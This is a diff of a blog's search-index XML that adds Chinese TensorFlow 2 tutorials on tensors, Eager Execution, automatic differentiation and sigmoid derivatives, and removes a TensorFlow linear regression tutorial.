+<td align="center">32 位有符号整型</td>
+</tr>
+<tr>
+<td align="center"><code>tf.int16</code></td>
+<td align="center">16 位有符号整型</td>
+</tr>
+<tr>
+<td align="center"><code>tf.int8</code></td>
+<td align="center">8 位有符号整型</td>
+</tr>
+<tr>
+<td align="center"><code>tf.uint8</code></td>
+<td align="center">8 位无符号整型</td>
+</tr>
+<tr>
+<td align="center"><code>tf.string</code></td>
+<td align="center">可变长度的字节数组</td>
+</tr>
+<tr>
+<td align="center"><code>tf.bool</code></td>
+<td align="center">布尔型</td>
+</tr>
+<tr>
+<td align="center"><code>tf.complex64</code></td>
+<td align="center">实数和虚数</td>
+</tr>
+</tbody></table>
+<p>另外，TensorFlow 通过三种符号约定来描述张量维度：<strong>阶，形状和维数</strong>。三者之间的关系如下：</p>
+<table>
+<thead>
+<tr>
+<th align="center">形状</th>
+<th align="center">阶</th>
+<th align="center">维数</th>
+<th align="center">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">[]</td>
+<td align="center">0</td>
+<td align="center">0-D</td>
+<td align="center">0 维张量，标量。</td>
+</tr>
+<tr>
+<td align="center">[D0]</td>
+<td align="center">1</td>
+<td align="center">1-D</td>
+<td align="center">形状为 [5] 的 1 维张量。</td>
+</tr>
+<tr>
+<td align="center">[D0, D1]</td>
+<td align="center">2</td>
+<td align="center">2-D</td>
+<td align="center">形状为 [3, 4] 的 2 维张量。</td>
+</tr>
+<tr>
+<td align="center">[D0, D1, D2]</td>
+<td align="center">3</td>
+<td align="center">3-D</td>
+<td align="center">形状为 [1, 4, 3] 的 3 维张量。</td>
+</tr>
+<tr>
+<td align="center">[D0, D1, … Dn-1]</td>
+<td align="center">n</td>
+<td align="center">n-D</td>
+<td align="center">形状为 [D0, D1, … Dn-1] 的张量。</td>
+</tr>
+</tbody></table>
+<p>值得注意的是，上表中的示例都是形容张量的形状。例如 <code>[3, 4]</code> 指的张量的形状为 <code>[3, 4]</code>，而不是张量 <code>[3, 4]</code>。</p>
+<p> 根据不同的用途，TensorFlow 中主要有 2 种张量类型，分别是：</p>
+<ul>
+<li><p><code>tf.Variable</code> ：变量 Tensor，需要指定初始值，常用于定义可变参数，例如神经网络的权重。</p>
+</li>
+<li><p><code>tf.constant</code> ：常量 Tensor，需要指定初始值，定义不变化的张量。</p>
+</li>
+</ul>
+<p>我们可以通过传入列表或 NumPy 数组来新建变量和常量类型的张量：</p>
+<p>查看tensorflow版本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">tf.__version__</span><br><span class="line"></span><br><span class="line">Out:  <span class="string">&#x27;2.1.0&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>  输入形状为 (2, 2) 的二维变量</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v = tf.Variable([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])  <span class="comment"># 形状为 (2, 2) 的二维变量</span></span><br><span class="line">v</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Variable <span class="string">&#x27;Variable:0&#x27;</span> shape=(<span class="number">2</span>, <span class="number">2</span>) dtype=int32, numpy=</span><br><span class="line">		array([[<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">      		   [<span class="number">3</span>, <span class="number">4</span>]], dtype=int32)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>  输入形状为 (2, 2) 的二维常量</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = tf.constant([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])  <span class="comment"># 形状为 (2, 2) 的二维常量</span></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">2</span>, <span class="number">2</span>), dtype=int32, numpy=</span><br><span class="line">    	 array([[<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">         	    [<span class="number">3</span>, <span class="number">4</span>]], dtype=int32)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出包含了张量的 3 部分属性，分别是形状 <code>shape</code>，数据类型 <code>dtype</code>，以及对应的 NumPy 数组。</p>
+<p>还可以直接通过 <code>.numpy()</code> 输出张量的 NumPy 数组：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c.numpy()</span><br><span class="line"></span><br><span class="line">Out:  array([[<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">             [<span class="number">3</span>, <span class="number">4</span>]], dtype=int32)</span><br></pre></td></tr></table></figure>
+
+<p>下面列举几个经常会用到的新建特殊常量张量的方法：</p>
+<ul>
+<li><code>tf.zeros</code>：新建指定形状且全为 0 的常量 Tensor</li>
+<li><code>tf.zeros_like</code>：参考某种形状，新建全为 0 的常量 Tensor</li>
+<li><code>tf.ones</code>：新建指定形状且全为 1 的常量 Tensor</li>
+<li><code>tf.ones_like</code>：参考某种形状，新建全为 1 的常量 Tensor</li>
+<li><code>tf.fill</code>：新建一个指定形状且全为某个标量值的常量 Tensor</li>
+</ul>
+<p>3x3 全为 0 的常量 Tensor</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = tf.zeros([<span class="number">3</span>, <span class="number">3</span>])  <span class="comment"># 3x3 全为 0 的常量 Tensor</span></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">3</span>, <span class="number">3</span>), dtype=float32, numpy=</span><br><span class="line">        array([[<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">               [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">               [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>]], dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>与 c 形状一致全为 1 的常量 Tensor</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.ones_like(c)  <span class="comment"># 与 c 形状一致全为 1 的常量 Tensor</span></span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">3</span>, <span class="number">3</span>), dtype=float32, numpy=</span><br><span class="line">        array([[<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">               [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">               [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>]], dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2x3 全为 6 的常量 Tensor</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.fill([<span class="number">2</span>, <span class="number">3</span>], <span class="number">6</span>)  <span class="comment"># 2x3 全为 6 的常量 Tensor</span></span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">2</span>, <span class="number">3</span>), dtype=int32, numpy=</span><br><span class="line">        array([[<span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>],</span><br><span class="line">               [<span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>]], dtype=int32)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>除此之外，还可以创建一些序列:</p>
+<ul>
+<li><code>tf.linspace</code>：创建一个等间隔序列。</li>
+<li><code>tf.range</code>：创建一个数字序列。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.linspace(<span class="number">1.0</span>, <span class="number">10.0</span>, <span class="number">5</span>, name=<span class="string">&quot;linspace&quot;</span>)</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">5</span>,), dtype=float32, numpy=array([ <span class="number">1.</span>  ,  <span class="number">3.25</span>,  <span class="number">5.5</span> ,  <span class="number">7.75</span>, <span class="number">10.</span>  ],     dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.range(start=<span class="number">1</span>, limit=<span class="number">10</span>, delta=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">5</span>,), dtype=int32, numpy=array([<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>], dtype=int32)&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Eager-Execution"><a href="#Eager-Execution" class="headerlink" title="Eager Execution"></a>Eager Execution</h2><p>TensorFlow 2 带来的最大改变之一是将 1.x 的 Graph Execution（图与会话机制）更改为 Eager Execution（动态图机制）。在 1.x 版本中，低级别 TensorFlow API 首先需要定义数据流图，然后再创建 TensorFlow 会话，这一点在 2.0 中被完全舍弃。TensorFlow 2 中的 Eager Execution 是一种命令式编程环境，可立即评估操作，无需构建图。</p>
+<p>所以说，TensorFlow 的张量运算过程可以像 NumPy 一样直观且自然了。接下来，我们以最简单的加法运算为例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c + c  <span class="comment"># 加法计算</span></span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">3</span>, <span class="number">3</span>), dtype=float32, numpy=</span><br><span class="line">        array([[<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">               [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">               [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>]], dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 1.x 版本的 TensorFlow，一个加法运算过程十分复杂。我们需要初始化全局变量 → 建立会话 → 执行计算，最终才能打印出张量的运算结果。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init_op = tf.global_variables_initializer()  <span class="comment"># 初始化全局变量</span></span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:  <span class="comment"># 启动会话</span></span><br><span class="line">    sess.run(init_op)</span><br><span class="line">    print(sess.run(c + c))  <span class="comment"># 执行计算</span></span><br></pre></td></tr></table></figure>
+
+<p>Eager Execution 带来的好处显而易见，其进一步降低了 TensorFlow 的入门门槛。之前的 Graph Execution 模式，实际上让很多人在入门时都很郁闷，因为完全不符合正常思维习惯。</p>
+<p>TensorFlow 中提供的数学计算，包括线性代数计算方面的方法也是应有尽有，十分丰富。下面，我们再列举几个示例:</p>
+<p>矩阵乘法：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = tf.constant([<span class="number">1.</span>, <span class="number">2.</span>, <span class="number">3.</span>, <span class="number">4.</span>, <span class="number">5.</span>, <span class="number">6.</span>], shape=[<span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">b = tf.constant([<span class="number">7.</span>, <span class="number">8.</span>, <span class="number">9.</span>, <span class="number">10.</span>, <span class="number">11.</span>, <span class="number">12.</span>], shape=[<span class="number">3</span>, <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">c = tf.linalg.matmul(a, b)  <span class="comment"># 矩阵乘法</span></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">2</span>, <span class="number">2</span>), dtype=float32, numpy=</span><br><span class="line">        array([[ <span class="number">58.</span>,  <span class="number">64.</span>],</span><br><span class="line">               [<span class="number">139.</span>, <span class="number">154.</span>]], dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>转置矩阵：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.linalg.matrix_transpose(c)  <span class="comment"># 转置矩阵</span></span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">2</span>, <span class="number">2</span>), dtype=float32, numpy=</span><br><span class="line">        array([[ <span class="number">58.</span>, <span class="number">139.</span>],</span><br><span class="line">               [ <span class="number">64.</span>, <span class="number">154.</span>]], dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>可以把 TensorFlow 理解成为 TensorFlow 式的 NumPy + 为搭建神经网络而生的 API</code></p>
+<h2 id="自动微分"><a href="#自动微分" class="headerlink" title="自动微分"></a>自动微分</h2><p>在数学中，微分是对函数的局部变化率的一种线性描述。虽然微分和导数是两个不同的概念。但是，对一元函数来说，可微与可导是完全等价的。如果熟悉神经网络的搭建过程，应该明白梯度的重要性。而对于复杂函数的微分过程是极其麻烦的，为了提高应用效率，大部分深度学习框架都有自动微分机制。</p>
+<p>TensorFlow 中，可以使用 <code>tf.GradientTape</code> 跟踪全部运算过程，以便在必要的时候计算梯度。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">w = tf.Variable([<span class="number">1.0</span>])  <span class="comment"># 新建张量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># 追踪梯度</span></span><br><span class="line">    loss = w * w</span><br><span class="line"></span><br><span class="line">grad = tape.gradient(loss, w)  <span class="comment"># 计算梯度</span></span><br><span class="line">grad</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">1</span>,), dtype=float32, numpy=array([<span class="number">2.</span>], dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面演示了一个自动微分过程，它的数学求导过程如下：</p>
+<p>$$ loss = w^2 \rightarrow \frac {\partial loss}{\partial w} = 2w $$</p>
+<p>所以，当 w 等于 1 时，计算结果为 2。</p>
+<p><code>tf.GradientTape</code> 会像磁带一样记录下计算图中的梯度信息，然后使用 <code>.gradient</code> 即可回溯计算出任意梯度，这对于使用 TensorFlow 低阶 API 构建神经网络时更新参数非常重要。</p>
+<h2 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h2><p>上面已经学习了 TensorFlow 核心知识，接下来将对 TensorFlow API 中的常用模块进行简单的功能介绍。对于框架的使用，实际上就是灵活运用各种封装好的类和函数。由于 TensorFlow API 数量太多，迭代太快，所以要养成随时 <a href="https://www.tensorflow.org/versions/r2.0/api_docs/python/tf"> <em>查阅官方文档</em></a> 的习惯。</p>
+<ul>
+<li><code>tf.</code>：包含了张量定义，变换等常用函数和类。</li>
+<li><code>tf.data</code>：输入数据处理模块，提供了像 <code>tf.data.Dataset</code> 等类用于封装输入数据，指定批量大小等。</li>
+<li><code>tf.image</code>：图像处理模块，提供了像图像裁剪，变换，编码，解码等类。</li>
+<li><code>tf.keras</code>：原 Keras 框架高阶 API。包含原 <code>tf.layers</code> 中高阶神经网络层。</li>
+<li><code>tf.linalg</code>：线性代数模块，提供了大量线性代数计算方法和类。</li>
+<li><code>tf.losses</code>：损失函数模块，用于方便神经网络定义损失函数。</li>
+<li><code>tf.math</code>：数学计算模块，提供了大量数学计算函数。</li>
+<li><code>tf.saved_model</code>：模型保存模块，可用于模型的保存和恢复。</li>
+<li><code>tf.train</code>：提供用于训练的组件，例如优化器，学习率衰减策略等。</li>
+<li><code>tf.nn</code>：提供用于构建神经网络的底层函数，以帮助实现深度神经网络各类功能层。</li>
+<li><code>tf.estimator</code>：高阶 API，提供了预创建的 Estimator 或自定义组件。</li>
+</ul>
+<p>在构建深度神经网络时，TensorFlow 可以说提供了你一切想要的组件，从不同形状的张量、激活函数、神经网络层，到优化器、数据集等，一应俱全。</p>
+]]></content>
+      <categories>
+        <category>Machine Learning</category>
+        <category>TensorFlow</category>
+      </categories>
+      <tags>
+        <tag>TensorFlow2.0</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>导数计算和自动微分实现</title>
+    <url>/xiaohong404.github.io/2020/10/26/TensorFlow2.0/%E5%AF%BC%E6%95%B0%E8%AE%A1%E7%AE%97%E5%92%8C%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86%E5%AE%9E%E7%8E%B0/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/26/TensorFlow2.0/%E5%AF%BC%E6%95%B0%E8%AE%A1%E7%AE%97%E5%92%8C%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86%E5%AE%9E%E7%8E%B0/0.png" class></strong></p>
+ <a id="more"></a>
+
+<h2 id="导数计算"><a href="#导数计算" class="headerlink" title="导数计算"></a>导数计算</h2><p>Sigmoid 函数是机器学习中会经常看到的一个函数，它是逻辑回归的基础也可以充当神经网络的激活函数。Sigmoid 函数如下所示：</p>
+<p>$<br>\mathit{sigmoid}(x) = \frac{1}{1+e^{-x}}<br>$</p>
+<p>下面使用Tensorflow实现sigmoid函数：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">tf.__version__</span><br><span class="line"></span><br><span class="line">Out:  <span class="string">&#x27;2.1.0&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span>(<span class="params">x</span>):</span></span><br><span class="line">    s = <span class="number">1</span> / (<span class="number">1</span> + tf.math.exp(-x))</span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
+
+<p>接下来，使用 TensorFlow 2 提供的方法初始化一组 [−10,10] 之间等间隔的 100 个值，并作为 Sigmoid 函数的输入。最终，使用 Matplotlib 绘制出 Sigmoid 函数的曲线。同样，使用 TensorFlow 2 提供的相关方法。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">%matplotlib inline</span><br><span class="line"></span><br><span class="line">x = tf.linspace(<span class="number">-10.0</span>, <span class="number">10.0</span>, <span class="number">100</span>)</span><br><span class="line">plt.plot(x, sigmoid(x))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/10/26/TensorFlow2.0/%E5%AF%BC%E6%95%B0%E8%AE%A1%E7%AE%97%E5%92%8C%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86%E5%AE%9E%E7%8E%B0/1.png" alt="image"></p>
+<p>接下来，对 Sigmoid 函数求导，并实现 Sigmoid 导数函数 <code>sigmoid_derivative(x)</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid_derivative</span>(<span class="params">x</span>):</span></span><br><span class="line">    d_s = sigmoid(x) * (<span class="number">1</span> - sigmoid(x))</span><br><span class="line">    <span class="keyword">return</span> d_s</span><br></pre></td></tr></table></figure>
+
+<p>同样，使用上面初始化好的 x 值，绘制 Sigmoid 函数导数的变化曲线。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.plot(x, sigmoid_derivative(x))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/10/26/TensorFlow2.0/%E5%AF%BC%E6%95%B0%E8%AE%A1%E7%AE%97%E5%92%8C%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86%E5%AE%9E%E7%8E%B0/2.png" alt="image"></p>
+<h2 id="自动微分"><a href="#自动微分" class="headerlink" title="自动微分"></a>自动微分</h2><p>TensorFlow 中，可以使用 <code>tf.GradientTape</code> 跟踪全部运算过程，以便在必要的时候计算梯度。当然，对于上方 Sigmoid 一元函数而言，也就是自动求导过程。</p>
+<p>接下来，使用在实验中学习到的方法，使用 <code>tf.GradientTape</code> 完成自动微分。同样，需要传入前面生成的等间距 x 并绘制出导数的变化曲线。提示，在计算梯度的过程中，x 可能需要被转换为变量张量。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = tf.Variable(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># 追踪梯度</span></span><br><span class="line">    s = <span class="number">1</span> / (<span class="number">1</span> + tf.math.exp(-x))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">grad = tape.gradient(s, x)  <span class="comment"># 计算梯度</span></span><br><span class="line">grad</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.plot(x.numpy(), grad.numpy())  <span class="comment"># 绘制 sigmoid 导数变化曲线</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/10/26/TensorFlow2.0/%E5%AF%BC%E6%95%B0%E8%AE%A1%E7%AE%97%E5%92%8C%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86%E5%AE%9E%E7%8E%B0/3.png" alt="image"></p>
+<p>可以发现，借助于自动微分机制，我们只需要书写计算过程即可得到关于任意变量的微分结果。</p>
+]]></content>
+      <categories>
+        <category>Machine Learning</category>
+        <category>TensorFlow</category>
+      </categories>
+      <tags>
+        <tag>TensorFlow2.0</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Heap II</title>
     <url>/xiaohong404.github.io/2020/10/17/Heap/Heap-II/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/17/Heap/Heap-II/0.png" class></strong></p>
@@ -1288,96 +1378,6 @@
       </categories>
       <tags>
         <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>TensorFlow2实现线性回归</title>
-    <url>/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/0.png" class></strong></p>
- <a id="more"></a>
-
-<p>线性回归是入门机器学习必学的算法，其也是最基础的算法之一。接下来，使用 TensorFlow 2 提供的 API 和 Eager Execution 机制对其进行实现。</p>
-<p>线性回归是一种较为简单，但十分重要的机器学习方法，它也是神经网络的基础。如下所示，线性回归要解决的问题就是如何找到最理想的直线去拟合散点样本。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/1.png" class></strong></p>
-<p>对于一个线性回归问题，一般来讲有 2 种解决方法，分别是：最小二乘法和梯度下降法。其中最小二乘法又分为两种求解思路：代数求解和矩阵求解。本次实验，将使用梯度下降方法来解决线性回归问题。同时，实验将使用 TensorFlow 低阶 API 和高阶 API 两种方法进行实现。</p>
-<h2 id="低阶-API-实现"><a href="#低阶-API-实现" class="headerlink" title="低阶 API 实现"></a>低阶 API 实现</h2><p>TensorFlow 的低阶 API 实现，实际上就是利用最基本的函数和组件，结合 Eager Execution 机制来完成。实验首先初始化一组随机数据样本，并添加噪声，然后将其可视化出来。</p>
-<p>在这个过程中，我们全部使用 TensorFlow 提供的 API 来完成，也可以使用numpy数组。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">TRUE_W = <span class="number">3.0</span></span><br><span class="line">TRUE_b = <span class="number">2.0</span></span><br><span class="line">NUM_SAMPLES = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化随机数据</span></span><br><span class="line">X = tf.random.normal(shape=[NUM_SAMPLES, <span class="number">1</span>]).numpy()</span><br><span class="line">noise = tf.random.normal(shape=[NUM_SAMPLES, <span class="number">1</span>]).numpy()</span><br><span class="line">y = X * TRUE_W + TRUE_b + noise  <span class="comment"># 添加噪声</span></span><br><span class="line"></span><br><span class="line">plt.scatter(X, y)</span><br></pre></td></tr></table></figure>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/2.png" class></strong></p>
-<p>接下来，定义一元线性回归模型：</p>
-<p>$<br>f(w, b, x) = w*x + b<br>$</p>
-<p>这里我们构建自定义模型类，并使用 TensorFlow 提供的 <code>tf.Variable</code> 随机初始化参数 <em>w</em> 和截距项 <em>b</em>。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.W = tf.Variable(tf.random.uniform([<span class="number">1</span>]))  <span class="comment"># 随机初始化参数</span></span><br><span class="line">        self.b = tf.Variable(tf.random.uniform([<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.W * x + self.b  <span class="comment"># w*x + b</span></span><br></pre></td></tr></table></figure>
-
-<p>上方展示了一个标准的 TensorFlow 模型类的构建方法。</p>
-<p>对于随机初始化的 <em>w</em> 和 <em>b</em>，我们可以将其拟合直线绘制到样本散点图中。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = Model()  <span class="comment"># 实例化模型</span></span><br><span class="line"></span><br><span class="line">plt.scatter(X, y)</span><br><span class="line">plt.plot(X, model(X), c=<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>正常情况下，应该会看到直线并没有很好地拟合样本。示例效果如下（仅参考）：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/3.png" class></strong></p>
-<p>当然，由于是随机初始化，也有极小概率一开始拟合效果非常好，那么重新执行一次上面的单元格另外随机初始化一组数据即可。尽可能保证一开始随机初始化的直线无法准确拟合数据，方便后续直观感受优化过程的效果。</p>
-<p>然后，定义线性回归使用到的损失函数。这里使用线性回归问题中常用的平方损失函数。</p>
-<p>$<br>{\rm Loss}(w, b, x, y) = \sum_{i=1}^N (f(w, b, x_i) - y_i)^2<br>$</p>
-<p>公式中，<em>f</em>(<em>w</em>,<em>b</em>,<em>$x_i$</em>) 是模型根据 <em>$x_i$</em> 计算的预测值，*$y_i$* 则表示真实值。</p>
-<p>接下来，根据公式实现损失计算函数，同样使用 TensorFlow 中的相关函数。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss_fn</span>(<span class="params">model, x, y</span>):</span></span><br><span class="line">    y_ = model(x)</span><br><span class="line">    <span class="keyword">return</span> tf.reduce_mean(tf.square(y_ - y))</span><br></pre></td></tr></table></figure>
-
-<p>接下来，就可以开始迭代过程了，这也是最关键的一步。使用梯度下降法求解线性回归的问题中，我们首先需要计算参数的梯度，然后使用梯度下降法来更新参数。<br>$$<br>\begin{align}<br>w &amp;\leftarrow w - lr * \frac{\partial {\rm loss}(w, b)}{\partial w} \<br>b &amp;\leftarrow b - lr * \frac{\partial {\rm loss}(w, b)}{\partial b}<br>\end{align}<br>$$<br>公式中，<em>lr</em> 指代学习率。</p>
-<p>梯度下降方法是数学中的一种最优化方法，常被用于神经网络的迭代优化过程。简单概括，梯度下降法就是沿着梯度下降方向去寻找损失函数的极小值（梯度的反方向）。过程如下图所示。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/4.png" class></strong></p>
-<p>TensorFlow 2 中的 Eager Execution 提供了 <code>tf.GradientTape</code> 用于追踪梯度。所以，下面我们对照着参数更新公式来实现梯度下降法的迭代更新过程。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">EPOCHS = <span class="number">10</span>  <span class="comment"># 全部数据迭代 10 次</span></span><br><span class="line">LEARNING_RATE = <span class="number">0.1</span>  <span class="comment"># 学习率</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(EPOCHS):  <span class="comment"># 迭代次数</span></span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># 追踪梯度</span></span><br><span class="line">        loss = loss_fn(model, X, y)  <span class="comment"># 计算损失</span></span><br><span class="line">    dW, db = tape.gradient(loss, [model.W, model.b])  <span class="comment"># 计算梯度</span></span><br><span class="line">    model.W.assign_sub(LEARNING_RATE * dW)  <span class="comment"># 更新梯度</span></span><br><span class="line">    model.b.assign_sub(LEARNING_RATE * db)</span><br><span class="line">    <span class="comment"># 输出计算过程</span></span><br><span class="line">    print(<span class="string">f&#x27;Epoch [<span class="subst">&#123;epoch&#125;</span>/<span class="subst">&#123;EPOCHS&#125;</span>], loss [<span class="subst">&#123;loss&#125;</span>], W/b [<span class="subst">&#123;model.W.numpy()&#125;</span>/<span class="subst">&#123;model.b.numpy()&#125;</span>]&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>上面的代码中，我们初始化 <code>tf.GradientTape()</code> 以追踪梯度，然后使用 <code>tape.gradient</code> 方法就可以计算梯度了。值得注意的是，<code>tape.gradient()</code> 第二个参数支持以列表形式传入多个参数同时计算梯度。紧接着，使用 <code>.assign_sub</code> 即可完成公式中的减法操作用以更新梯度。</p>
